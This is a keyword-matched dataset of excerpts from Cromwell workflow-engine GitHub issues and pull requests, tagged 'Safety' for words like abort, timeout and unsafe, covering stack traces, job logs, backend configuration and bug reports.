Safety, scala.util.Either$RightProjection.flatMap(Either.scala:702); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:36); cats.instances.EitherInstances$$anon$1.flatMap(either.scala:32); cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); languages.wdl.draft3.WdlDraft3LanguageFactory.getWomBundle(WdlDraft3LanguageFactory.scala:50); languages.wdl.draft3.WdlDraft3LanguageFactory.$anonfun$validateNamespace$2(WdlDraft3LanguageFactory.scala:39); scala.util.Either.flatMap(Either.scala:338); languages.wdl.draft3.WdlDraft3LanguageFactory.validateNamespace(WdlDraft3LanguageFactory.scala:38); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:138); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); akka,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:11918,unsafe,unsafeRunAsync,11918,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,1,['unsafe'],['unsafeRunAsync']
Safety," the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/jes/src/test/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActorSpec.scala: // TODO: PBE: This spec may run faster by going back to mocks? Also, building the actor ref is copy/pasted a lot; ./supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystemAsyncJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: This test needs work. If the abort fires to quickly, it causes a race condition in waitAndPostProcess.; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: abort doesn't actually seem to abort. It runs the full 10 seconsds, then returns the response.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:2787,abort,abort,2787,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,3,['abort'],['abort']
Safety," to Success; 2023-04-18 22:00:18,464 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:106:1]: Status change from Running to Success; 2023-04-18 22:01:20,604 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:111:1]: Status change from Running to Success; 2023-04-18 22:14:47,728 INFO - WorkflowExecutionActor-10fa31a8-acbe-4ab7-a96a-6550ec08df12 [UUID(10fa31a8)]: Aborting workflow; 2023-04-18 22:14:47,729 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8):myco.pull:262:1] Aborted StandardAsyncJob(projects/16371921765/locations/us-central1/operations/9178938377659283430); 2023-04-18 22:14:47,729 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:112:1]: PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8):myco.pull:112:1] Aborted StandardAsyncJob(projects/16371921765/locations/us-central1/operations/8559201934542591362); 2023-04-18 22:14:48,295 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: Successfully requested cancellation of projects/16371921765/locations/us-central1/operations/9178938377659283430; 2023-04-18 22:15:56,564 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:112:1]: Status change from Running to Success; 2023-04-18 22:16:44,505 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(10fa31a8)myco.pull:262:1]: Status change from Running to Cancelled; 2023-04-18 22:16:44,539 INFO - WorkflowExecutionActor-10fa31a8-acbe-4ab7-a96a-6550ec08df12 [UUID(10fa31a8)]: WorkflowExecutionActor [UUID(10fa31a8)] aborted: myco.pull:262:1; 2023-04-18 22:16:45,159 INFO - $f [UUID(10fa31a8)]: Copying workflow logs from /cromwell-workflow-logs/workflow.10fa31a8-acbe-4ab7-a96a-6550ec08df12.log to gs://fc-caa84e5a-8ef7-434e-af9c-feaf6366a042/submissions/93bf6971-bfa1-4cb8-bb22-c8a753f58c49/workflow.logs/workflow.10fa31a8-acbe-4ab7-a96a-6550ec08df12.log; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7121:5981,abort,aborted,5981,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7121,1,['abort'],['aborted']
Safety," two runs at the same time since cromwell db gets locked by the previous run until it is finished? If yes, is there any other way to do it?. PS: I understand that cromwell provides `server` mode where we can submit runs via REST API end points. However, we are working on HPC cluster where we don't have admin privileges to start server and submit requests to api. Backend: `slurm`; Workflow: [Link](https://github.com/biowdl/RNA-seq/blob/develop/RNA-seq.wdl). <details>; <summary>Config</summary>. ```; backend {. default = slurm. providers {; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int time_minutes = 600; Int cpu = 4; #Int memory = 500; String queue = ""short""; String map_path = ""/shared/rna-seq""; String partition = ""compute""; String root = ""/shared/rna-seq/cromwell-executions""; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. submit = """"""; task=`echo ${job_name}|cut -d'_' -f3`; echo $task; image=`grep ""\b$task\b"" ${map_path}/map.txt |cut -d',' -f2`; echo $PWD; echo $image; if [ ! -z $image ]; then \; echo ""Inside Singularity exec""; \; echo ""CPU count: "" ${cpu}; \; echo ""time_minutes: "" ${time_minutes}; \; sbatch -J ${job_name} -D ${cwd} -c ${cpu} -o ${out} -e ${err} -t ${time_minutes} --wrap ""singularity exec -B /shared/rna-seq:/shared/rna-seq $image /bin/bash ${script}""; else \; echo ""No Singularity""; \; sbatch -J ${job_name} -D ${cwd} -c ${cpu} -o ${out} -e ${err} -t ${time_minutes} --wrap ""/bin/bash ${script}""; fi;; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }; ```. </details>. <details>;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6208:1327,timeout,timeout-seconds,1327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6208,1,['timeout'],['timeout-seconds']
Safety, type:compute)'.; 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:619); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:627); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1108); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1104); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4920:1469,recover,recoverWith,1469,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4920,1,['recover'],['recoverWith']
Safety,"![image](https://user-images.githubusercontent.com/165320/46151480-da3c2080-c23c-11e8-97a4-ecfa39139c11.png). We're seeing intermittent connectivity issues w/ message of ""socket timeout, cannot connect to server"" in Pingdom. They last 1-3 minutes and seem to be off and on:; ![image](https://user-images.githubusercontent.com/165320/46151547-05267480-c23d-11e8-865a-f9c1fc1c4e4d.png). From the looks of things this looks to be between pingdom and the load balancer or proxy, as neither Cromwell nor proxy logs are showing signs of distress during these times.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4164:178,timeout,timeout,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4164,1,['timeout'],['timeout']
Safety,""": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello/hello-stdout.log"",; ""commandLine"": ""sleep 60 \necho \""Hello World! Welcome to Cromwell . . . on Google Cloud!\"""",; ""shardIndex"": -1,; ""jes"": {; ""executionBucket"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca"",; ""endpointUrl"": ""https://genomics.googleapis.com/"",; ""googleProject"": ""broad-dsde-alpha""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 10 SSD"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""ubuntu:latest"",; ""maxRetries"": ""0"",; ""cpu"": ""1"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-b"",; ""memoryMin"": ""2.048 GB"",; ""memory"": ""2.048 GB""; },; ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ""inputs"": {; ""addressee"": ""World""; },; ""backendLabels"": {; ""cromwell-workflow-id"": ""cromwell-9cc9b141-b2fb-4277-94bd-80ad87a49663"",; ""wdl-task-name"": ""hello""; },; ""labels"": {; ""wdl-task-name"": ""hello"",; ""cromwell-workflow-id"": ""cromwell-9cc9b141-b2fb-4277-94bd-80ad87a49663""; },; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""Unexpected execution handle: AbortedExecutionHandle""; }; ],; ""message"": ""java.lang.IllegalArgumentException: Unexpected execution handle: AbortedExecutionHandle""; }; ],; ""backend"": ""JES"",; ""end"": ""2018-12-11T16:07:04.207Z"",; ""stderr"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello/hello-stderr.log"",; ""callRoot"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello"",; ""attempt"": 1,; ""executionEvents"": [; {; ""startTime"": ""2018-12-11T16:07:02.746Z"",; ""description"": ""RequestingExecutionToken"",; ""endTime"": ""2018-12-11T16:07:03.606Z""; },; {; ""startTime"": ""2018-12-11T16:07:03.648Z"",; ""description"": ""RunningJob"",; ""endTime"": ""2018-12-11T16:07:04.116Z""; },; {; ""startTime"": ""2018-12-11T16:07:04.116Z"",; ""des",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4484:1597,Abort,AbortedExecutionHandle,1597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4484,1,['Abort'],['AbortedExecutionHandle']
Safety,"""Absence of evidence is not evidence of absence"", but still... ""proof"" these changes didn't make any thing worse in Jenkins, so far.; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/778/. Also [this log](https://travis-ci.org/broadinstitute/cromwell/jobs/445976070) shows a 10s timeout for the additionally patched `SimpleWorkflowActorSpec`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4313#issuecomment-432909067:305,timeout,timeout,305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4313#issuecomment-432909067,1,['timeout'],['timeout']
Safety,"""Pipeline"" Scopes are added only for ""Pipeline"" Credentials.; Otherwise scopes must be requested when asking for credentials.; `Credential` generator (vs. `Credentials`, the former an older API) still returns an unscoped Credential.; Renamed methods returning Credentials from `credential` to `credentials`.; Now also validating USA Credentials before returning.; Credentials lookups from workflow options are only done for ""Pipeline"" creds and tests.; Removed a `validate(WorkflowOptions)` that wasn't in use since commit 6fbeadc.; Removed scope declarations no longer in use.; Using scope-constants as-much-as-possible from the Google SDKs.; Added an `unsafe` to replace `toTry.get`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4054:654,unsafe,unsafe,654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4054,1,['unsafe'],['unsafe']
Safety,"""This"" is the original topic, copying outputs to different locations. It could be a way to ""flatten"" directories. However, as you noted on the [other issue](https://github.com/broadinstitute/cromwell/issues/1641), there is the risk of overwriting results.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1642#issuecomment-345035327:227,risk,risk,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1642#issuecomment-345035327,1,['risk'],['risk']
Safety,"""bjobs -w ${job_id} |& egrep -qvw 'not found|EXIT|JOBID'"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path+modtime""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3;; hsqldb.log_size=0; """"""; connectionTimeout = 86400000; numThreads = 2; }; insert-batch-size = 2000; read-batch-size = 5000000; write-batch-size = 5000000; metadata {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-metadata-db/;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3;; hsqldb.log_size=0; """"""; connectionTimeout = 86400000; numThreads = 2; }; insert-batch-size = 2000; read-batch-size = 5000000; write-batch-size = 5000000; }; }. services {; MetadataService {; metadata-read-row-number-safety-threshold = 5000000; }; }; ```; The main issue that I can see is that Cromwell is ignoring the increased metadata row count. this is despite my separating out the metadata database and increasing the thresholds on both databases. Prior to running the changes listed above I have ensured that the working directory is completely purged of logs and metadata so as to ensure an unobstructed run. The documentation currently provides no additional guidance on how to overcome the error. Any assistance will be appreciated.; Best wishes,. Matthieu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7203:3641,safe,safety-threshold,3641,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7203,1,['safe'],['safety-threshold']
Safety,"""monitor_stop.log""; File dstat=""dstat.log""; File debug_bundle=""debug_bundle.tar.gz""; } runtime {; docker : ""gcr.io/btl-dockers/btl_gatk:1""; memory: ""${ram_gb}GB""; cpu: ""${cpu_cores}""; disks: ""local-disk ${output_disk_gb} HDD""; bootDiskSizeGb: ""${boot_disk_gb}""; preemptible: ""${preemptible}""; }; parameter_meta {. }. }. application.conf. ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. system.new-workflow-poll-rate=1; ```; google {. application-name = ""cromwell"". auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; }; ]; }. engine {; filesystems {; gcs {; }; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. backend {; default = ""Jes""; providers {; Jes {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""gcid-cromwell"". // Base bucket for workflow executions. // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; caching {; duplication-strategy = ""reference""; }. }; }; }; }; }; }; ```. I executed a haplotype caller wdl with interval scattering. Two of the shards took over 5 before I aborted the workflow, while the others finished in under 1 hour. The timestamps on the RC file, which indicated a 0 return code, were similar to the other shards that finished in under an hour. . This looks like a bug. I've since restarted the worklow with call-caching so it seems unlikely I can reproduce this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3905:5605,abort,aborted,5605,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3905,1,['abort'],['aborted']
Safety,"# Thursday. 1. Jobs ""queued in cromwell""; 2. Doug started job, 8 hours to start; 3. Graphite under-reporting. # Friday. 1. No improvement; 2. User1 suggests his own wf running w/ 25k jobs; 3. disk quota hit; 4. **No limit on # jobs running / project**; 4. Console quotas page revealed this; 5. User1 aborts wf; 6. 10 minutes of improvement, then back down to low throughput; 7. **Difficult to understand who is running what**; 8. We found a crude query to ask ^; 9. Bubbled up sub-wf's manually; 10. Found User2 running a large job; 11. User had upped quotas on # cpus, persistent disk and IP's; 12. **Exhausted IP quota, PAPI throttles itself as a result of too many API calls**",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3666:300,abort,aborts,300,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3666,1,['abort'],['aborts']
Safety,"# What Happened. On Friday September 14, a user noted that they were unable to retrieve metadata associated with their workflow. Subsequent calls were made to the endpoint directly to retrieve this metadata. During this time, New Relic reported memory exhaustion and extensive (~30 mins) of garbage collection. Ultimately, the instance stopped responding to requests but continued accepting connections, resulting in proxy timeout log messages. ![image](https://user-images.githubusercontent.com/165320/45637785-56827700-ba79-11e8-9176-1991692fcc76.png). # What should have happened. Crowell frontend should have either:. * returned the result in a timely manner ; * failed more gracefully. # What we did to fix it. Rebooted the instances. Subsequent calls to retrieve the metadata also timed out but did not put the frontend back into the ""zombie"" state. # Potential causes. The metadata is too large to fit in memory. The present situation is that there is some processing done between DB and user in order to provide a more structured response. # Potential fixes. The timeout on Cromwell should be increased beyond the current 20s. The metadata could always be larger than the instance has memory. Either a streaming response or deferred computation of the structured result would be better. # Technical Addendums:. Error Message when unresponsive:. ```; September 14th 2018, 14:19:31.000 - Sep 14 14:19:31 gce-cromwell-prod801 cromwell-proxy[2525]: [Fri Sep 14 14:19:31.508796 2018] [proxy:error] [pid 162:tid 139866926597888] [client 130.211.0.195:49012] AH00898: Error reading from remote server returned by /engine/v1/version; September 14th 2018, 14:19:31.000 - Sep 14 14:19:31 gce-cromwell-prod801 cromwell-proxy[2525]: [Fri Sep 14 14:19:31.316500 2018] [proxy:error] [pid 162:tid 139867379803904] (110)Connection timed out: AH00957: HTTP: attempt to connect to 172.17.0.2:8000 (app) failed; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4105:423,timeout,timeout,423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4105,2,['timeout'],['timeout']
Safety,"# What happens. When a large workflow is queried for metadata, cromwell spends a considerable amount of time preparing the repsonse. **This usually results in a timeout for the caller.** In some cases, the preparation is so expensive that Cromwell either runs out of memory or enters a zombie-like state(#4105). # What should happen. The caller should receive a timely response, and Cromwell should not be endangered by operations on large workflows. # Speculation: Construction of result. The result is constructed in a two-phase manner: gather all the data, then produce a structured response. This is done for two reasons:. 1. Unstructured metadata is difficult for a human to understand.; 1. There are possibly many duplicates due to the way restarts are handled. ## Recommendation. ~Stream results (using doobie SQL library?) and construct response while gathering data. This should mean that a large pool of data is never present in memory, only the current result set and the partial response.~. Not streaming for now. Instead going to [`foldMap`](https://typelevel.org/cats/typeclasses/foldable.html) large sequence into `Map` monoid, then combine all those maps together into a final result. . There is some manipulation to be done after combining a result. 1. Sort calls by time; 1. Prune duplicates by taking the most recent. [This has some special cases](https://github.com/broadinstitute/cromwell/blob/3d68421b025db26ac3ab53972f69497e90601a47/engine/src/main/scala/cromwell/webservice/metadata/MetadataComponent.scala#L93) that need to be considered. # Speculation: Database table. The metadata table is currently an unindexed monster, comprising 10^6 - 10^9 rows and between 2-3 TB of data. The query has historically been surprisingly performant but is likely going to degrade over time. ## Recommendation . **punt on DB changes**. Believe to be related to #4093 and #4105",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124:161,timeout,timeout,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124,1,['timeout'],['timeout']
Safety,"## Discussion \#1; ```; bshifaw [3:59 PM]; Hi Chris, ; The featured joint calling method is using NIO.; https://portal.firecloud.org/#methods/gatk/joint-discovery-gatk4/9/wdl; Is this the method you are referencing? (edited). bshifaw [4:28 PM]; @vdauwera, just confirmed with @jsoto. The wdl isn’t using NIO when importing the GVCFs. Due to a change in the wdl we decide to implement to best leverage the FC data model (using an array of input files instead of a sample name map file). (edited). Collapse; cwhelan [9:48 PM]; right, that’s the method i was using. vdauwera [11:22 PM]; oooh that’s an interesting case that would benefit from the flexible data models work — this would be great to show @andreah; ```. ## Discussion \#2. ```; cwhelan [11:17 AM]; ie it’s trying to localize each gvcf to each shard instance. tjeandet [11:17 AM]; do you have an idea of how many input files each shard has ?. Collapse; cwhelan [11:17 AM]; 555 samples; ```. # Takeaways. Run https://portal.firecloud.org/#methods/gatk/joint-discovery-gatk4/9/wdl in a non-production environment w/ 555 samples and try to reproduce issue w/ hashing timeouts. We predict they will not occur as cromwell production was seeing elevated CPU usage due to it's /stats endpoint being hit repeatedly.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3712:1124,timeout,timeouts,1124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3712,2,"['predict', 'timeout']","['predict', 'timeouts']"
Safety,"## Symptom; I can run test and assembly tasks succesfully on cromwellApiClient subproject, but If I write my own small test class that uses `cromwell.api.CromwellClient` it fails at runtime with:; ```; Detected java.lang.NoSuchMethodError error, which MAY be caused by incompatible Akka versions on the classpath. Please note that a given Akka version MUST be the same across all modules of Akka that you are using, e.g. if you use akka-actor [2.5.3 (resolved from current classpath)] all other core Akka modules MUST be of the same version. External projects like Alpakka, Persistence plugins or Akka HTTP etc. have their own version numbers - please make sure you're using a compatible set of libraries. ; Uncaught error from thread [default-akka.actor.default-dispatcher-5]: akka.actor.ActorCell.addFunctionRef(Lscala/Function2;)Lakka/actor/FunctionRef;, shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for for ActorSystem[default]; java.lang.NoSuchMethodError: akka.actor.ActorCell.addFunctionRef(Lscala/Function2;)Lakka/actor/FunctionRef;; ...; ```; I'm essentially seeing exactly the behaviour described in reference [1] below, which is eviction warnings at compile time and then the runtime blow-up. The root cause seems to be that akka-http depends on an older version of akka-actor (2.4.19) than that specified for the project (2.5.3). Running `dependencyTree` task confirms:; ```; [info] +-com.typesafe.akka:akka-http-spray-json_2.12:10.0.9 [S]; [info] | +-com.typesafe.akka:akka-http_2.12:10.0.9 [S]; [info] | | +-com.typesafe.akka:akka-http-core_2.12:10.0.9 [S]; [info] | | +-com.typesafe.akka:akka-parsing_2.12:10.0.9 [S]; [info] | | | +-com.typesafe.akka:akka-actor_2.12:2.4.19 (evicted by: 2.5.3); ```; If I explicitly add dependency on the latest akka-stream as suggested in [2] and [3], the problem goes away:; ```; diff --git a/project/Dependencies.scala b/project/Dependencies.scala; index 0d77e2d3..7254fc61 100644; --- a/project/Dependencies.scala; +++ b/project",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2579:202,Detect,Detected,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2579,1,['Detect'],['Detected']
Safety,"## Why; Emerald empire scattered 100k wide and it didn’t go well. * Cromwell pegged CPU and was unresponsive to HTTP calls, forcing the process manager to kill it; * Papi v2 deadlocked w/ load (talked to Aaron Kemp & Henry Ferrara, No-op for us. ## What; Send 100k wide scatter to Cromwell, make sure it handles it gracefully. ## Measure. * Time it took to complete scatter (TODO: not sure at which point to consider ""complete"", almost certainly it should be before the WDL is run and thus avoids the inherent variance of the backend ); * CPU (should not be pegged); * HTTP Responsiveness (should respond to HTTP calls in a reasonable time: < 2s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4795:490,avoid,avoids,490,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4795,1,['avoid'],['avoids']
Safety,"### Description. After playing a while with GCP Batch:; 1. Batch can automatically retry preemption errors.; 2. When Batch retries, there is no signal in the Job status events, we need to check the VM logs.; 3. Cromwell does not get any details about Batch retries, hence, the same jobId is kept even if a VM is recreated.; 4. When the job status events mention that the job failed due to a preemption error, this is final, Batch already exhausted the retries. This removes all the code related to handling preemption errors and parses the job status events to derive the failure reason. Also, this tries detecting the other potential exit codes mapping them to a better error message. Refs:; - [Batch automated task retries](https://cloud.google.com/batch/docs/automate-task-retries); - [Batch exit codes](https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes). <!-- What is the purpose of this change? What should reviewers know? -->. Fixes #7407. This is an example error log produced when getting a preemption error:. ```; [2024-06-21 12:30:09,28] [info] WorkflowManagerActor: Workflow 2cdef371-703c-4c1e-92b5-0e013dcda6c8 failed (during ExecutingWorkflowState): java.lang.Exception: Task myWorkflow.myTask:NA:1 failed: A Spot VM for the job was preempted during run 